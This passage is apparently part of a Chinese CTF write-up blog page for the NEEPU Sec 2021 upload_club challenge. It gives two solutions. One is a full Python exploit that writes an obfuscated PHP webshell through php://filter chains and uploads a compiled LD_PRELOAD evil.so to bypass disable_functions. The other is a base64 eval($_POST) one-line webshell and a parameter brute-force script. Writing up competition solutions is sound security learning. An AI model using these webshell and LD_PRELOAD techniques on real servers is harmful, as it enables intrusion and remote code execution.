class="hljs-literal">NULL</span>) &#123;<br>    payload(cmd);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -Wall -fPIC -shared -o evil<span class="hljs-selector-class">.so</span> evil<span class="hljs-selector-class">.c</span> -ldl<br></code></pre></td></tr></table></figure>
+
+<p>采用 <code>move_uploaded_file</code> 函数进行多文件上传，最后在根目录下找到 <code>getflag</code> 和 <code>flag</code>，访问 <code>/getflag</code> 得到 <code>flag</code></p>
+<p><strong>EXP:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://neepusec.club:18762/index.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0&quot;</span>,<br>        <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;data:,123456&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>    &#125;<br>    <span class="hljs-comment"># phpinfo()</span><br>    <span class="hljs-comment"># upload = &quot;neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?%3Chp%20phpipfn(o;)%3E?/resource=w0s1np&quot;</span><br>    <span class="hljs-comment"># ls /</span><br>    <span class="hljs-comment"># upload = &quot;neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?&lt;hp pomevu_lpaoed_difel$(F_LISE&#x27;[veli]&#x27;&#x27;[mt_panem]&#x27;&#x27;,t/pme/iv_lil&#x27;b;)upetvn&#x27;(DLP_EROLDA/=mt/pvelil_bi)&#x27;p;tune(v_\&quot;velimc=dsl/ )\&quot;m;ia(la&#x27;,&#x27;a&#x27;,&#x27;a&#x27;)&#x27;e;hc oifelg_tec_noettn(s/&#x27;mt/p0_tuup.txt&#x27;t;)&gt;?&#x27;);/resource=w0s1np&quot;</span><br>    <span class="hljs-comment"># /getflag</span><br>    upload = <span class="hljs-string">&quot;neepu[sec.club=php://filter/write=convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?&lt;hp pomevu_lpaoed_difel$(F_LISE&#x27;[veli]&#x27;&#x27;[mt_panem]&#x27;&#x27;,t/pme/iv_lil&#x27;b;)upetvn&#x27;(DLP_EROLDA/=mt/pvelil_bi)&#x27;p;tune(v_\&quot;velimc=dg/telfga)\&quot;m;ia(la&#x27;,&#x27;a&#x27;,&#x27;a&#x27;)&#x27;e;hc oifelg_tec_noettn(s/&#x27;mt/p0_tuup.txt&#x27;t;)&gt;?/resource=w0s1np&quot;</span><br><br>    res = requests.post(url=url, headers=headers, data=upload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">require</span>():</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0&quot;</span>,<br>        <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;data:,123456&quot;</span>,<br>    &#125;<br>    require_once = &#123;<span class="hljs-string">&quot;neepu[sec.club&quot;</span>: <span class="hljs-string">&quot;data:,123456/w0s1np&quot;</span>&#125;<br>    files = &#123;<span class="hljs-string">&quot;evil&quot;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./evil.so&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)&#125;<br>    res = requests.post(url=url, headers=headers, data=require_once, files=files)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    upload()<br>    neepu = require()<br></code></pre></td></tr></table></figure>
+
+
+
+<p><code>atao</code>WP如下：</p>
+<p>1.这里利用了 <code>file_get_contents(&#39;php://input&#39;)</code> 方式获取了POST的所有内容，然后去匹配， 如果存在<code>25</code>则结束，但是这里有个缺陷，如果POST上传的形式不是 <code>application/x-www-formurlencoded</code> 而是 <code>multipart/form-data</code> 则获取不到POST请求参数可以绕过这里。</p>
+<p><img src="https://woshilnp.github.io/wzimg/268.png" alt="a"></p>
+<p>2.这里有个 <code>neepu_sec.club</code> <code>POST</code>请求的参数如果直接写的话是不行，不过可以写脚本简单遍历一 下 </p>
+<p><img src="https://woshilnp.github.io/wzimg/269.png" alt="a"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1/ceshi/a.php&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>		data = &#123;<br>			<span class="hljs-string">&#x27;neepu&#x27;</span>+<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;sec&#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27;club&#x27;</span>:<span class="hljs-number">123</span><br>		&#125;<br>		res = requests.post(url=url,data=data)<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;neepu_sec.club&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>			<span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;neepu&#x27;</span>+<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&#x27;sec&#x27;</span>+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&#x27;club&#x27;</span><br>			exit(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#PHP代码:&lt;?var_dump($_POST);?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>3.其实这步就简单了，因为我们已经绕过了第1点的限制了，所以这里变的很简单，可以直接使用编 码绕过 <code>base64</code> 、 <code>string</code> ，使用<code>php</code>伪协议 <code>php://filter</code> ，但是需要写入文件，这里我利用的过滤器 是 <code>string.strip_tags|convert.base64-decode</code> ，最后 <code>resource</code> 配置为 <code>? &gt;PD89ZXZhbCgkX1BPU1RbMV0pOz8+/../21.txt</code> ，这里使用 <code>?&gt;</code> 闭合前面的<code>php</code>代码，则他们都会被 <code>string.strip_tags</code> 过滤器删除，接着 <code>base64</code> 过滤器将剩下的字符进行解码，则获得一句话木马</p>
+<p><img src="https://woshilnp.github.io/wzimg/270.png" alt="a"></p>
+<p>4.这里看似不能用<code>&lt;?</code> 和 <code>php</code> ，但是如果文件是以 <code>&lt;?</code> 开头则可以绕过，而不能用 <code>php</code> 的话，使用短标签 <code>&lt;?=?&gt;</code> 即可</p>
+<p><img src="https://woshilnp.github.io/wzimg/271.png" alt="a"></p>
+<p>接下来是详细步骤，先上传了一句话木马</p>
+<p><img src="https://woshilnp.github.io/wzimg/277.png" alt="a"></p>
+<p>然后去包含它，执行<code>phpinfo()</code>时发现过滤好多函数，看来是要绕过<code>df</code>了</p>
+<p><img src="https://woshilnp.github.io/wzimg/278.png" alt="a"></p>
+<p>然后<code>atao</code>师傅利用了一个绕<code>php7</code>的<code>df</code>文件，将它通过<code>file_put_contents</code>函数写入。</p>
+<p><img src="https://woshilnp.github.io/wzimg/279.png" alt="a"></p>
+<p>访问根目录下，有个<code>getflag</code>的文件，执行就获得<code>flag</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP"><span class="toc-number">1.</span> <span class="toc-text">[NEEPU Sec 2021 公开赛]WP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A82-0"><span class="toc-number">1.2.</span> <span class="toc-text">随便注2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-myth-of-Aladdin"><span class="toc-number">1.3.</span> <span class="toc-text">The_myth_of_Aladdin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gamebox"><span class="toc-number">1.4.</span> <span class="toc-text">gamebox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize-club"><span class="toc-number">1.5.</span> <span class="toc-text">serialize_club</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-club"><span class="toc-number">1.6.</span> <span class="toc-text">upload_club</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&text=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&is_video=false&description=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NEEPU Sec 2021 公开赛 WP&body=Check out this article: http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&title=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&name=NEEPU Sec 2021 公开赛 WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/&t=NEEPU Sec 2021 公开赛 WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
